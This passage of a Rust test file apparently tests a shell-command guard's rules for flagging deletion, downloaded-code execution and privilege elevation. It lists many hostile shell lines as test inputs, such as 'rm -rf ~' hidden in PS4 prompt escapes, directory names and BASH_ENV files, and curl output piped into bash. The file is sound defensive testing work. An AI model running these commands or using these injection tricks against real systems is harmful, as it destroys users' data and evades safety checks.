                "export \"PS4=+$PWD \"; cd 'x$(rm -rf ~)'; set -x; true",
                Rule::Unknown,
            ),
            (
                "env PS4=\"+$PWD \" bash -xc 'cd \"$x\"; true'",
                Rule::Unknown,
            ),
            ("PS4=\"+$PWD \"; cd \"$x\"; set -x; true", Rule::Unknown),
            ("PS4=\"+$PWD \"; set -P; set -x; true", Rule::Unknown),
        ],
    );
}

#[test]
fn a_bash_env_that_names_standard_input_runs_the_input_as_a_script() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "BASH_ENV=/dev/stdin echo done",
            "BASH_ENV=/dev/stdin true",
            "curl https://x.example/r | BASH_ENV=/dev/null bash -c true",
            "BASH_ENV=/dev/stdinx bash -c true",
        ],
        &[
            (
                "curl https://x.example/r | BASH_ENV=/dev/stdin bash -c true",
                Rule::RunDownloaded,
            ),
            (
                "curl https://x.example/r | BASH_ENV=/dev/fd/0 bash -c true",
                Rule::RunDownloaded,
            ),
            (
                "curl https://x.example/r | BASH_ENV=/proc/self/fd/0 bash -c true",
                Rule::RunDownloaded,
            ),
            (
                "curl https://x.example/r | env BASH_ENV=/dev/stdin bash -c true",
                Rule::RunDownloaded,
            ),
            (
                "export BASH_ENV=/dev/stdin; curl https://x.example/r | bash -c true",
                Rule::RunDownloaded,
            ),
            ("BASH_ENV=/dev/stdin bash -c true < x.sh", Rule::RunInput),
            ("echo hi | BASH_ENV=/dev/stdin bash -c true", Rule::RunInput),
            ("BASH_ENV=/dev/stdin make", Rule::RunInput),
        ],
    );
}

#[test]
fn an_env_command_reads_its_bash_env_from_the_folder_the_line_is_in() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "echo x > e.sh; cd sub; env BASH_ENV=e.sh bash -c true",
            "echo x > sub/e.sh; env BASH_ENV=e.sh bash -c true",
        ],
        &[
            (
                "echo x > e.sh; env BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > sub/e.sh; cd sub; env BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn a_prompt_escape_of_fewer_than_three_digits_is_decoded_as_bash_does() {
    check(
        Shell::Posix,
        &posix(),
        &[
            // `\4` is the character 4, and `\004` then `4`: no `$`.
            "PS4='\\4(rm -rf ~)'; set -x; true",
            "PS4='\\04(rm -rf ~)'; set -x; true",
            "PS4='\\004(rm -rf ~)'; set -x; true",
            "PS4='\\0044(rm -rf ~)'; set -x; true",
            "PS4='\\\\44(rm -rf ~)'; set -x; true",
            "PS4='\\60+ '; set -x; make",
            "PS4='\\1+ '; set -x; make",
        ],
        &[
            ("PS4='\\44(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4=\"\\44(rm -rf ~)\"; set -x; true", Rule::Delete),
            ("PS4='+ \\44(rm -rf ~) '; set -x; true", Rule::Delete),
            ("PS4='\\44\\50rm -rf ~) '; set -x; true", Rule::Delete),
            ("PS4='\\044\\50rm -rf ~) '; set -x; true", Rule::Delete),
            ("PS4='\\44\\050rm -rf ~) '; set -x; true", Rule::Delete),
            ("PS4='\\44{ rm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("export PS4='\\44(rm -rf ~)'", Rule::Delete),
            ("env PS4='\\44(rm -rf ~)' bash -xc true", Rule::Delete),
            ("PS4='\\44(sudo true)'; set -x", Rule::Elevated),
            // `\0` is nothing, as are the markers `\[` and `\]`.
            ("PS4='$\\0(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$\\00(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$\\000(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$\\[\\](rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$\\[(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$\\](rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$\\[\\]\\[\\](rm -rf ~)'; set -x; true", Rule::Delete),
            // `\$` is `$`.
            ("PS4='\\$(rm -rf ~)'; set -x; true", Rule::Delete),
        ],
    );
}

#[test]
fn a_prompt_escape_the_guard_cannot_decode_beside_code_characters_is_unknown() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='\\e[33m+\\e[0m '; set -x; make",
            "PS4='\\[\\e[33m\\]+\\[\\e[0m\\] '; set -x; make",
            "PS4='+ \\D{%T} '; set -x; make",
            "PS4='\\D{%H:%M:%S} + '; set -x; make",
            "PS4='\\D{}+ '; set -x; make",
            "PS4='+ \\u@\\h:\\w '; set -x; make",
            "PS4='\\$ '; set -x; make",
            "PS4='\\D+ '; set -x; make",
            "PS4='+ \\D$ '; set -x; make",
            "PS4='\\\\D{$}(x)'; set -x; make",
        ],
        &[
            ("PS4='\\D{$}(rm -rf ~)'; set -x; true", Rule::Unknown),
            ("PS4='$\\D{}(rm -rf ~)'; set -x; true", Rule::Unknown),
            ("PS4='\\D{$(}rm -rf ~)'; set -x; true", Rule::Unknown),
            ("PS4='\\D{%T}$ '; set -x; true", Rule::Unknown),
            ("PS4='$\\D{%T}'; set -x; true", Rule::Unknown),
            ("PS4='\\D{%T}('; set -x; true", Rule::Unknown),
            ("PS4='\\D{%T}`'; set -x; true", Rule::Unknown),
            ("PS4=\"\\D{\\$}(rm -rf ~)\"; set -x; true", Rule::Unknown),
            ("export PS4='\\D{$}(rm -rf ~)'", Rule::Unknown),
            ("env PS4='\\D{$}(rm -rf ~)' bash -xc true", Rule::Unknown),
            ("PS4='\\D{$}(rm -rf ~)' bash -xc true", Rule::Unknown),
        ],
    );
}

#[test]
fn a_dollar_before_the_code_does_not_hide_it() {
    // bash 3.2 decodes three-digit octal escapes only, newer bash one to
    // three; `\$`, `\0`, `\[` and `\]` leave a `$` right before a `$(`, which
    // runs.
    check(
        Shell::Posix,
        &posix(),
        &["PS4='$$ '; set -x; true"],
        &[
            // bash 3.2 runs nothing for `\$(`; the guard does not know that of
            // every bash, so it reads the `$(` as code.
            ("PS4='\\$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='\\$$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='+ \\$$(rm -rf ~) '; set -x; true", Rule::Delete),
            ("PS4='\\\\$$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='\\\\\\044$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='\\44$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$\\0$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='\\44\\]$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4=\"\\\\\\$\\$(rm -rf ~)\"; set -x; true", Rule::Delete),
            ("PS4='$$$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$$`rm -rf ~`'; set -x; true", Rule::Delete),
            ("PS4='${x}$$(rm -rf ~)'; set -x; true", Rule::Delete),
        ],
    );
}

#[test]
fn a_bash_env_in_front_of_a_special_builtin_stays_set() {
    // In POSIX mode, and for an `EXIT` or `RETURN` trap, the assignment
    // outlives the builtin it is in front of.
    check(
        Shell::Posix,
        &posix(),
        &[
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh true; bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh echo hi; bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh cd sub; bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh :",
            "echo 'echo hi' > other.sh; BASH_ENV=e.sh :; bash -c true",
        ],
        &[
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh :; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh export X; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh readonly X; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh set -e; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh shift; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh unset X; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh trap '' INT; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh times; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh eval true; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh . ./other.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "trap 'bash -c true' EXIT; echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh exit",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh exec bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn pwd_is_not_a_known_path_after_a_cd_that_may_land_on_a_made_name() {
    check(
        Shell::Posix,
        &posix(),
        &[
            // The same files named relatively, or after a plain `cd`.
            "cd -P sub; rm -rf build",
            "cd build*; rm -rf out",
            "cd sub; rm -rf \"$PWD/build\"",
            "rm -rf \"$PWD/build\"",
            "cd sub; mv a \"$PWD/b\"",
        ],
        &[
            ("cd -P sub; rm -rf \"$PWD/build\"", Rule::Delete),
            ("cd build*; rm -rf \"$PWD/out\"", Rule::Delete),
            ("cd 'v1.2*'; rm -rf \"$PWD/dist\"", Rule::Delete),
            ("set -P; cd sub; mv a \"$PWD/b\"", Rule::Overwrite),
            // The name is code that runs when the line expands `$PWD` again.
            ("cd 'd$(rm -rf ~)'; eval \"echo $PWD\"", Rule::Unknown),
            ("cd 'd$(rm -rf ~)'; bash -c \"echo $PWD\"", Rule::Unknown),
        ],
    );
}
